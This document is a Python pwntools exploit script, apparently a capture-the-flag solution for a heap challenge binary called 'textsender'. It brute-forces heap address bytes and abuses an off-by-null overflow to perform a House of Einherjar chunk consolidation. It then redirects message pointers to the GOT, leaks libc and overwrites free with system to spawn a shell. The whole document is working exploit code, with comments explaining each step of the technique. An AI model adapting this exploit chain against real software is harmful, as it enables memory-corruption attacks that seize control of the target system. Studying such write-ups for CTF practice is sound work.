#!/usr/bin/env python3

# type: ignore
# flake8: noqa

"""
off-by-null -> house on einherjar
1/16 chance to work due to unknown 2nd byte of heap base
"""

from pwn import *

elf = context.binary = ELF("./textsender", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def set_sender(s):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"name: ", s)


def add_message(r, msg):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Receiver: ", r)
    io.sendlineafter(b"Message: ", msg)


def send_all():
    io.sendlineafter(b"> ", b"5")


def print_all():
    io.sendlineafter(b"> ", b"4")


def edit_message(r, msg):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Name: ", r)
    resp = io.recvline()
    if b"Cannot find name!" in resp:
        return False
    io.sendlineafter(b"New message: ", msg)
    return True


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


env = {}
io = start()

add_message(b"a", b"a")
add_message(b"a", b"a")
send_all()

add_message(b"a", b"a")

heap = 0
third_byte = None
for i in range(256):
    if i == 10:
        continue
    if edit_message(b"a\x00" + p8(i), b"m"):
        third_byte = i
        break


fourth_byte = None
for i in range(256):
    if i == 10:
        continue
    if edit_message(b"a\x00" + p8(third_byte) + p8(i), b"m"):
        fourth_byte = i
        break

if third_byte is None or fourth_byte is None:
    log.info("heap base address contains b'\\n'")
    io.close()
    quit()

heap |= (third_byte << 16) | (fourth_byte << 24)

log.info(f"heap @ {heap>>16:#x}?000")

heap |= 0xc << 12

if not args.REMOTE:
    with open(f"/proc/{io.pid}/maps") as f:
        for line in f.readlines():
            if "[heap]" in line:
                heap = int(line.split("-")[0], 16)

log.info(f"guess {heap=:#x}")

send_all()

# Fill up tcachebins
for i in range(7):
    add_message(b"dummy", b"dummy")


msg = cyclic(0x170) + flat(0, 0x91)
msg = msg.ljust(0x1f0, b"\x00")
add_message(b"editor", msg)

"""
When `edit_message` is called, `getline` is used to get our input and it will
allocate heap address after our message.

Heap layout:
receiver (chunk_size=0x80)
message (chunk_size=0x200)
input (chunk_size=0x80) <-- lowest size is 0x80

Since we have off-by-null on message data which could overflow the input chunk
size, we could unset the input `prev_inuse` bit and trigger backward
consolidation with a fake chunk inside message chunk

However, to trigger backward consolidation, our input chunk size needs to be
larger than tcache max chunk size such that when our input is freed, it goes
into unsorted bin (required for backward consolidation)

From trial-and-error, we could see that the getline allocated chunk size
increases from:
- 0x80
- 0x100
- 0x1f0 (0x100+(0x100-0x10))
- 0x3d0 (0x1f0+(0x1f0-0x10))
- 0x790 (0x3d0+(0x3d0-0x10))

0x3d0 still lies in tcache range, so 0x790 is the ideal size

To be able to write into our message chunk after the input chunk is allocated,
we would need to utilize the `edit_message` function and pass the receiver
comparison check. Notice that our receiver is only 0x78 bytes long and our
input needs to be more than 0x3c8 bytes to get the 0x790 chunk size allocated.

Luckily, the comparison check is not bounded by the length of the receiver but
instead bounded by our input length. Thus, we could provide an input like this
receiver's data + message's metadata + message's data + input's metadata +
input's data (recurse to receiver's data + message's metadata + ...)

The next thing to consider is when we overwrite the input chunk size with NULL,
the size data is changed from 0x791 into 0x700. When this chunk is freed, the
program would complain about size corruption. Hence, to avoid this error, we
need to create a fake chunk with 0x91 as the size metadata inside our input's
data
"""

q = b"editor".ljust(0x70, b"\x00")
q += flat(0, 0x201)
q += msg
q += flat(0, 0x791)
q += b"editor".ljust(0x70, b"\x00")
q += flat(0, 0x201)
q += msg
q += flat(0, 0x791)
q += b"editor".ljust(0x70, b"\x00")
q += flat(0, 0x201)
q += msg

# Payload to create a fake chunk in our message's data and perform off-by-null
p = flat(0, 0x1f0) + p64(heap + 0x1600) * 2
p = p.ljust(0x1f0, b"A")
p += p64(0x1f0)  # prev_size

edit_message(q, p)

"""
Now our fake chunk inside message's data is consolidated together with `getline`
input chunk
The next malloc would return our created fake chunk, which in this case is a
struct that contains the receiver pointer and message pointer
"""
add_message(b"victim", b"victim")

"""
With our message chunk overlaps with the pointer struct chunk, we could easily
overwrite both the receiver and message pointer to point to GOT
"""
edit_message(b"editor", flat(0, 0x21) + p64(elf.got["free"]) * 2)

"""
After the struct points to GOT, we could leak libc
"""
print_all()
io.recvuntil(b"8) ")
libc_leak = u64(io.recvline(keepends=False).split(b": ")[0].ljust(8, b"\x00"))
libc.address = libc_leak - libc.symbols["free"]
log.info(f"{libc.address=:#x}")

"""
Then, we overwrite the GOT
"""
edit_message(p64(libc_leak), p64(libc.symbols["system"]))
edit_message(b"/bin/sh\x00", b"m")

io.interactive()
